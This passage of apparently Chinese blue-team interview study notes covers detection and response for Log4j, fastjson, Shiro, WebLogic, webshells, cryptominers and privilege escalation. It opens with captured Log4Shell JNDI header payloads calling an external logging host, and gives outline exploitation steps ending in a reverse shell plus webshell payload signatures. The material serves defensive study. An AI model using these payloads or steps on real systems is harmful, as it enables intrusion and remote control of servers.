+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">X-Client-IP: $&#123;jndi:ldap://1644763261510dpicz.zdl7qs.ceye.io/VXBQo&#125;</span><br><span class="line">X-Remote-IP: $&#123;jndi:ldap://1644763261510jnabe.zdl7qs.ceye.io/vl&#125;</span><br><span class="line">X-Remote-Addr: $&#123;jndi:ldap://1644763261510xplnj.zdl7qs.ceye.io/hTE&#125;</span><br><span class="line">X-Forwarded-For: $&#123;jndi:ldap://1644763261510lbnhl.zdl7qs.ceye.io/hvgsw&#125;</span><br><span class="line">X-Originating-IP: $&#123;jndi:ldap://1644763261510pbhdy.zdl7qs.ceye.io/LxrC&#125;</span><br><span class="line">True-Client-IP: $&#123;jndi:rmi://1644763261510jjchm.zdl7qs.ceye.io/FrfXm&#125;</span><br><span class="line">Originating-IP: $&#123;jndi:rmi://1644763261510jctho.zdl7qs.ceye.io/vbP&#125;</span><br><span class="line">X-Real-IP: $&#123;jndi:rmi://1644763261510fyvxt.zdl7qs.ceye.io/fWmjt&#125;</span><br><span class="line">Client-IP: $&#123;jndi:rmi://1644763261510nfaoa.zdl7qs.ceye.io/mS&#125;</span><br><span class="line">X-Api-Version: $&#123;jndi:rmi://1644763261510daeem.zdl7qs.ceye.io/IdJ&#125;</span><br><span class="line">Sec-Ch-Ua: $&#123;jndi:dns://1644763261510wjiit.zdl7qs.ceye.io/IX&#125;</span><br><span class="line">Sec-Ch-Ua-Platform: $&#123;jndi:dns://1644763261510dacbb.zdl7qs.ceye.io/ftA&#125;</span><br><span class="line">Sec-Fetch-Site: $&#123;jndi:dns://1644763261510rypwe.zdl7qs.ceye.io/asWuD&#125;</span><br><span class="line">Sec-Fetch-Mode: $&#123;jndi:dns://1644763261510osrig.zdl7qs.ceye.io/zc&#125;</span><br><span class="line">Sec-Fetch-User: $&#123;jndi:dns://1644763261510uvfsl.zdl7qs.ceye.io/oNpOs&#125;</span><br><span class="line">Sec-Fetch-Dest: $&#123;jndi:dns://1644763261510ptqen.zdl7qs.ceye.io/fGwFl&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220611162251120.png" alt="image-20220611162251120"></p>
+<h1 id="fastjson-content-type"><a href="#fastjson-content-type" class="headerlink" title="fastjson(content type)"></a>fastjson(content type)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">autotype再处理json的时候，没有对@type进行安全验证，就可以传入危险的类，远程连接rmi主机，反弹shell之类的操作。</span><br><span class="line"></span><br><span class="line">面试官：它有什么指纹特征吗？</span><br><span class="line">@type,然后大部分版本???payload还有autocommit:ture</span><br><span class="line"></span><br><span class="line">复现步骤</span><br><span class="line">（1）开启环境</span><br><span class="line">黑客使用payload攻击主机A（该payload需要指定rmi/ldap地址）</span><br><span class="line">主机A引发反序列化漏洞，进行ldap远程方法调用，去连接主机B的9999端口。</span><br><span class="line">主机B的LDAP服务指定加载主机C的恶意java类，所以主机A通过主机B的LDAP服务最终加载并执行主机C的恶意java类。</span><br><span class="line">主机A执行恶意Java类，主机B获得反弹shell，控制主机A。</span><br><span class="line">进入docker容器进行复现</span><br><span class="line"></span><br><span class="line">开启抓包确定是不是fastjson框架，通过修改请求包判断是否是fastjson框架  ，应为fastjson有一个严格的格式才能解析，否则会报错</span><br><span class="line">准备一个恶意的类</span><br><span class="line">使用javac编译 rmi.java文件  生成一个类文件      </span><br><span class="line">然后将类文件放到监听的服务器上</span><br><span class="line">使用工具运行rmi文件</span><br><span class="line">修改数据包中的post请求主体</span><br><span class="line">然后进行端口监听</span><br><span class="line">点击go,发现反弹shell成功</span><br></pre></td></tr></table></figure>
+
+<h1 id="最近的spring-rce"><a href="#最近的spring-rce" class="headerlink" title="最近的spring rce"></a>最近的spring rce</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个CVE-2010-1622漏洞的原因是Spring参数绑定时，可以注入一个Java pojo对象，这个对象可以是恶意的去注册一些敏感tomcat的属性，最后通过修改Tomcat的配置来执行危险操作。</span><br><span class="line">class.*</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="挖矿病毒的处置"><a href="#挖矿病毒的处置" class="headerlink" title="挖矿病毒的处置"></a>挖矿病毒的处置</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">（一）Windows系统</span><br><span class="line"></span><br><span class="line">2、在防火墙关闭不必要的映射端口号或服务，重启再测试是否还会有可疑进程存在；</span><br><span class="line"></span><br><span class="line">3、对操作系统及系统相关管理界面的登录设置强密码（10位以上，大小写字母、数字及特殊字符的组合）。</span><br><span class="line"></span><br><span class="line">（二）Linux/mac系统</span><br><span class="line"></span><br><span class="line">2、在防火墙关闭不必要的映射端口号或服务，重启再测试是否还会有可疑进程存在。</span><br><span class="line"></span><br><span class="line">3、建议系统管理员对操作系统及系统相关管理界面的登录设置强密码（10位以上，大小写字母、数字及特殊字符的组合）；</span><br></pre></td></tr></table></figure>
+
+<p>netstat -antp   linux查看进程</p>
+<p>0x00 前言</p>
+<p> 随着虚拟货币的疯狂炒作，挖矿病毒已经成为不法分子利用最为频繁的攻击方式之一。病毒传播者可以利用个人电脑或服务器进行挖矿，具体现象为电脑CPU占用率高，C盘可使用空间骤降，电脑温度升高，风扇噪声增大等问题。</p>
+<p>0x01 应急场景</p>
+<p> 某天上午重启服务器的时候，发现程序启动很慢，打开任务管理器，发现cpu被占用接近100%，服务器资源占用严重。</p>
+<p><img src="http://39.99.247.218:8081/static/d2luLTgtMS5wbmc=1653544352" alt="win81.png"></p>
+<p>0x02 事件分析</p>
+<p> 登录网站服务器进行排查，发现多个异常进程：</p>
+<p><img src="http://39.99.247.218:8081/static/d2luLTgtMi5wbmc=1653544276" alt="win82.png"></p>
+<p>分析进程参数：</p>
+<p>wmic process get caption,commandline /value &gt;&gt; tmp.txt</p>
+<p><img src="http://39.99.247.218:8081/static/d2luLTgtMy5wbmc=1653544367" alt="win83.png"><br>TIPS:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在windows下查看某个运行程序（或进程）的命令行参数</span><br><span class="line">使用下面的命令：</span><br><span class="line">wmic process get caption,commandline /value</span><br><span class="line">如果想查询某一个进程的命令行参数，使用下列方式：</span><br><span class="line">wmic process where caption=”svchost.exe” get caption,commandline /value</span><br><span class="line">这样就可以得到进程的可执行文件位置等信息。</span><br></pre></td></tr></table></figure>
+
+<p>访问该链接：</p>
+<p><img src="http://39.99.247.218:8081/static/d2luLTgtNC5wbmc=1653544339" alt="win84.png"><br>Temp目录下发现Carbon、run.bat挖矿程序:</p>
+<p><img src="http://39.99.247.218:8081/static/d2luLTgtNS5wbmc=1653544334" alt="win85.png"></p>
+<p>具体技术分析细节详见：</p>
+<blockquote>
+<p>360CERT：利用WebLogic漏洞挖矿事件分析</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/92223">https://www.anquanke.com/post/id/92223</a></p>
+</blockquote>
+<p>清除挖矿病毒：关闭异常进程、删除c盘temp目录下挖矿程序 。</p>
+<p><strong>临时防护方案</strong></p>
+<ol>
+<li><p>根据实际环境路径，删除WebLogic程序下列war包及目录</p>
+<p>rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war</p>
+<p>rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war</p>
+<p>rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat</p>
+</li>
+<li><p>重启WebLogic或系统后，确认以下链接访问是否为404</p>
+<p><a target="_blank" rel="noopener" href="http://x.x.x.x:7001/wls-wsat">http://x.x.x.x:7001/wls-wsat</a></p>
+</li>
+</ol>
+<p>0x04 防范措施</p>
+<p> 新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率。通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞，如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞，Struts2远程命令执行等，导致大量服务器被感染挖矿程序的现象 。总结了几种预防措施：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护</span><br><span class="line">2、及时更新 Windows安全补丁，开启防火墙临时关闭端口</span><br><span class="line">3、及时更新web漏洞补丁，升级web组件</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="webshell工具的流量特征"><a href="#webshell工具的流量特征" class="headerlink" title="webshell工具的流量特征"></a>webshell工具的流量特征</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53577336/article/details/125048353">(83条消息) Webshell工具的流量特征分析（菜刀，蚁剑，冰蝎，哥斯拉）_告白热的博客-CSDN博客_webshell流量特征</a></p>
+<p>菜刀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">数据包流量特征：</span><br><span class="line">1，请求包中：ua头为百度，火狐</span><br><span class="line">2，请求体中存在eval，base64等特征字符</span><br><span class="line">3，请求体中传递的payload为base64编码，并且存在固定的QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload特征：</span><br><span class="line">Php中使用assert，eval执行,</span><br><span class="line">asp 使用eval</span><br><span class="line">在jsp使用的是Java类加载（ClassLoader）,同时会带有base64编码解码等字符特征</span><br><span class="line"></span><br><span class="line">数据包流量特征：</span><br><span class="line">使用普通的一句话都存在以下特征：</span><br><span class="line">每个请求体都存在@ini_set(“display_errors”, “0”);@set_time_limit(0)开头。并且后面存在base64等字符</span><br><span class="line">响应包的结果返回格式为：</span><br><span class="line">随机数</span><br><span class="line">响应内容</span><br><span class="line">随机数</span><br></pre></td></tr></table></figure>
+
+<p>冰蝎</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">paylaod分析：</span><br><span class="line">php在代码中同样会存在eval或assert等字符特征</span><br><span class="line">在aps中会在for循环进行一段异或处理</span><br><span class="line">在jsp中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征</span><br><span class="line"></span><br><span class="line">冰蝎2.0流量特征：</span><br><span class="line">第一阶段请求中返回包状态码为200，返回内容必定是16位的密钥</span><br><span class="line">请求包存在：Accept: text/html, image/gif, image/jpeg, ; q=.2, /; q=.2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>哥斯拉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload特征：</span><br><span class="line">jsp会出现xc,pass字符和Java反射（ClassLoader，getClass().getClassLoader()），base64加解码等特征</span><br><span class="line">php，asp则为普通的一句话木马</span><br><span class="line"></span><br><span class="line">哥斯拉流量分析：</span><br><span class="line">作为参考：</span><br><span class="line">所有请求中Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8</span><br><span class="line">所有响应中Cache-Control: no-store, no-cache, must-revalidate,</span><br><span class="line">同时在所有请求中Cookie中后面都存在；特征</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="shiro反序列化-cookie"><a href="#shiro反序列化-cookie" class="headerlink" title="shiro反序列化(cookie)"></a>shiro反序列化(cookie)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞</span><br><span class="line"></span><br><span class="line">1.2.4 key是写在源码里的，找到key就能构造攻击链，1.2.4之后的775key是随机生成的，但我们还可以构造cookie，尝试构造攻击链。</span><br><span class="line">Shiro流量特征:数据包含有多个$$$符号，C参数含有base64编码。</span><br><span class="line"></span><br><span class="line">（1）开启环境，抓包判断是否是shiro框架</span><br><span class="line">在cookie后边加上rememberMe=1，如果回复包出现rememberMe=deleteMe，说明他就是shiro框架</span><br><span class="line">(2)获取key值，因为key值在源码中，所以需要使用工具获取</span><br><span class="line"> （3）爆破利用链</span><br><span class="line"> （4）执行反序列化漏洞命令执行</span><br><span class="line"> </span><br><span class="line"> 出网协议：rmi，jndi，ldap，jrm，jmx，jms</span><br><span class="line"> </span><br><span class="line"> Shiro-550，只需输入url，即可完成自动化检测和漏洞利用。Shiro-721，需输入url，提供一个有效的rememberMe Cookie，并指定目标操作系统类型。</span><br></pre></td></tr></table></figure>
+
+<h1 id="如何判断攻击成功"><a href="#如何判断攻击成功" class="headerlink" title="如何判断攻击成功"></a>如何判断攻击成功</h1><p>看请求包和响应包</p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144014925.png" alt="image-20220613144014925"></p>
+<h1 id="扫描器流量特征"><a href="#扫描器流量特征" class="headerlink" title="扫描器流量特征"></a>扫描器流量特征</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144342246.png" alt="image-20220613144342246"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144346894.png" alt="image-20220613144346894"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220613144353800.png" alt="image-20220613144353800"></p>
+<h1 id="Redis未授权-6379"><a href="#Redis未授权-6379" class="headerlink" title="Redis未授权  6379"></a>Redis未授权  6379</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002422083.png" alt="image-20220616002422083"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615195653696.png" alt="image-20220615195653696"></p>
+<p>大概就是写文件进去，开机自启动，定时任务，以及写入ssh公钥</p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615200123174.png" alt="image-20220615200123174"></p>
+<h1 id="勒索病毒怎么处理"><a href="#勒索病毒怎么处理" class="headerlink" title="勒索病毒怎么处理"></a>勒索病毒怎么处理</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204218916.png" alt="image-20220615204218916"></p>
+<h1 id="命令执行代码执行常见函数"><a href="#命令执行代码执行常见函数" class="headerlink" title="命令执行代码执行常见函数"></a>命令执行代码执行常见函数</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204425176.png" alt="image-20220615204425176"></p>
+<h1 id="一些安全加固"><a href="#一些安全加固" class="headerlink" title="一些安全加固"></a>一些安全加固</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220615204615956.png" alt="image-20220615204615956"></p>
+<h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>14882+14883组合拳，14882做一个未授权访问，登到控制台，然后通过14883命令执行，写一个xml文件把命令写进去，让它去访问你的vps然后加载xml。</p>
+<p>xml的反序列化漏洞，通过xmldecoder还是什么导致的xml解析代码执行。弱口令。</p>
+<p>流量特征:不加密，常见的出网协议也可以用。有很多T3协议的特征，文件操作和冰蝎一样有fileoutstream字段。</p>
+<h1 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002440960.png" alt="image-20220616002440960"></p>
+<h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002454227.png" alt="image-20220616002454227"></p>
+<h1 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220920190833089.png" alt="image-20220920190833089"></p>
+<p>**UDF (user defined function)**，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，其实就像使用本地MySQL函数如 user() 或 concat() 等。</p>
+<p>在 udf.dll 文件中刻字机定义函数，然后5,1以下导入到<code> c:\windows</code>或者 <code>c:\windows\system32</code>下，5.1以上导入到<code>MySQL Server 5.xx\lib\plugin</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">udf利用条件</span><br><span class="line">（1）MySQL数据库没有开启安全模式。</span><br><span class="line">（2）已知的数据库账号具有对MySQL数据库insert和delete的权限，最好是root最高权限。</span><br><span class="line">（3）shell有写入到数据库安装目录的权限。</span><br><span class="line">（4）知道绝对路径</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="研判"><a href="#研判" class="headerlink" title="研判"></a>研判</h1><p>蓝队研判<br>研判工作要充分利用已有安全设备（需要提前了解客户的网络拓扑以及部署设备情况），分析其近期的设备告警，将全部流量日志（日志条件：源地址，目的地址，端口，事件名称，时间，规则 ID，发生 次数等）根据研判标准进行筛选（像挖矿、蠕虫、病毒、拒绝服务这类不太可能为攻击方发起的攻击的事件，直接过滤掉，减少告警数量），一般情况下，真实攻击不可能只持续一次，它一定是长时间、周期性、多 IP 的进行攻击</p>
+<p>对于告警结合威胁情报库如：微步、奇安信威胁情报中心、绿盟威胁情报云等对于流量日志的原 IP 地址进行分析，判断其是否为恶意攻击，推荐使用微步的插件，如果确认为攻击行为或者不能确认是否为攻击行为，进行下一步操作，在之前准备好的表格中查找 IP 是否为客户内网部署的设备，如果不是，继续进行下一步，在事件上报平台查看是否有其他人提交过，如果没有，则上报</p>
+<p>然后根据流量日志，对请求数据包和返回数据包分析判断其是否为误报，需要留意 X-Forwarded-For（简称XFF）和 x-real-ip 可以了解些 webshell 工具的流量特征，尤其是免杀 webshell，有可能不会被设备识别</p>
+<p>最后上报事件时，尽可能提供完整的截图，包括源 ip、目的ip，请求包请求体，响应包响应体等重要信息，以方便后续人员研判溯源</p>
+<p>研判经验谈</p>
+<blockquote>
+<p>敏感操作</p>
+<p>敏感命令</p>
+<p>敏感时间点</p>
+<p>日志记录</p>
+<p>设备提示</p>
+<p>流量信息</p>
+<p>安全警告</p>
+<p>物理设备报错</p>
+</blockquote>
+<p>弱口令经验谈</p>
+<blockquote>
+<p>爆破攻击告警需格外谨慎，可能是“正在进行时”。</p>
+<p>更据数量及业务是否对外开放，判断报错的数量大小（如果是内网不开放却出现大量警告就是特征）</p>
+<p>根据时间点（半夜还有人频繁登录，凌晨还有管理员在操作电脑）概率极小</p>
+<p>更据返回值的字段（Burpsuite的使用，我们可以知道，如果登录成功，返回的字符长度不一样）</p>
+<p>判断返回的请求值（不可取，可能不成功也会返回200）只能当一个弱特征！</p>
+</blockquote>
+<p>内网经验谈</p>
+<blockquote>
+<p>攻击IP可以是内网IP（大概率是远控）特征：扫描探测行为、爆破行为、命令执行等漏扫行为，这个时候可以考虑对该主机，流量进行检测</p>
+<p>通过进一步研判确定行为是否有攻击特征（eg：可能是通过弱口令、SQL注入、RCE进入内网所导致的）</p>
+<p>排查检测完毕后，对目标进行加固，并检查硬件设备和周围区域主机，篡写报告</p>
+</blockquote>
+<p>告警排查经验谈</p>
+<blockquote>
+<p>通过安全检测：检查是否存在后门程序、代码行为、命令执行等行为</p>
+<p>练习研判师傅通过流量检测系统确认存在，攻击行为</p>
+<p>应急与加固复责引导攻击进入蜜罐和修复漏洞，篡写报告</p>
+</blockquote>
+<h1 id="常见的框架漏洞"><a href="#常见的框架漏洞" class="headerlink" title="常见的框架漏洞"></a>常见的框架漏洞</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616002859095.png" alt="image-20220616002859095"></p>
+<h1 id="spring的漏洞"><a href="#spring的漏洞" class="headerlink" title="spring的漏洞"></a>spring的漏洞</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103236191.png" alt="image-20220616103236191"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103245713.png" alt="image-20220616103245713"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103255437.png" alt="image-20220616103255437"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103307691.png" alt="image-20220616103307691"></p>
+<p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103314706.png" alt="image-20220616103314706"></p>
+<h1 id="thinkphp框架漏洞"><a href="#thinkphp框架漏洞" class="headerlink" title="thinkphp框架漏洞"></a>thinkphp框架漏洞</h1><h2 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h2><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103546015.png" alt="image-20220616103546015"></p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616103559468.png" alt="image-20220616103559468"></p>
+<h1 id="冰蝎内存马怎么查杀-以及其他"><a href="#冰蝎内存马怎么查杀-以及其他" class="headerlink" title="冰蝎内存马怎么查杀 以及其他"></a>冰蝎内存马怎么查杀 以及其他</h1><p>冰蝎内存马用的是jvm加载类字节码的能力，常规的工具很难检测查杀，github上已经有查杀冰鞋jvm内存马的工具。</p>
+<p>如果我们通过检测工具或者其他手段发现了一些内存webshell的痕迹，需要有一个排查的思路来进行跟踪分析，也是根据各类型的原理，列出一个排查思路。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">如果是jsp注入，日志中排查可疑jsp的访问请求。</span><br><span class="line"></span><br><span class="line">如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法</span><br><span class="line"></span><br><span class="line">根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</span><br><span class="line"></span><br><span class="line">如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。</span><br><span class="line"></span><br><span class="line">如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200</span><br></pre></td></tr></table></figure>
+
+<h1 id="webshell排查"><a href="#webshell排查" class="headerlink" title="webshell排查"></a>webshell排查</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.系统如果已经被植入后门，说明攻击者已经攻击成功，而且拿到权限，这时候日志信息可能提供不了帮助，首先要去考虑系统的账户是否安全，，又没口令爆破成功的痕迹，排查账号的密码是否已经不安全.</span><br><span class="line"></span><br><span class="line">(Linux)的话看计划任务,有没有定时反弹shell,还有就是进程是不是可疑在通信.发现可疑问题,就要样本分析. crontab -l</span><br><span class="line"></span><br><span class="line">(windows)的话就看启动项和进程.</span><br><span class="line"></span><br><span class="line">如果是web入侵,看日志web服务是不是安全?还原攻击的流程.</span><br></pre></td></tr></table></figure>
+
+<h1 id="反向代理的工具"><a href="#反向代理的工具" class="headerlink" title="反向代理的工具"></a>反向代理的工具</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616162629488.png" alt="image-20220616162629488"></p>
+<h1 id="数据库有哪些"><a href="#数据库有哪些" class="headerlink" title="数据库有哪些"></a>数据库有哪些</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616225637341.png" alt="image-20220616225637341"></p>
+<h1 id="php危险函数"><a href="#php危险函数" class="headerlink" title="php危险函数"></a>php危险函数</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220616225652582.png" alt="image-20220616225652582"></p>
+<h1 id="黄金白银票据"><a href="#黄金白银票据" class="headerlink" title="黄金白银票据"></a>黄金白银票据</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220919142934218.png" alt="image-20220919142934218"></p>
+<h1 id="linux比较重要的目录"><a href="#linux比较重要的目录" class="headerlink" title="linux比较重要的目录"></a>linux比较重要的目录</h1><p><img src="/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/image-20220920161729837.png" alt="image-20220920161729837"></p>
+<h1 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h1><p>参数：-u URL 、-v 输出日志、-r 读取文件 、–random-agent随机UA、–dbs获取所有数据库、–cookie指定cookie</p>
+<p>–level 2 指定测试范围 2可以测试cookie 、–data= 指定post请求参数 、–batch 默认设置</p>
+<p>–risk 3 设置威胁级别、–technique= 指定测试的注入类型、-g 代入google查询 -p 指定测试的参数</p>
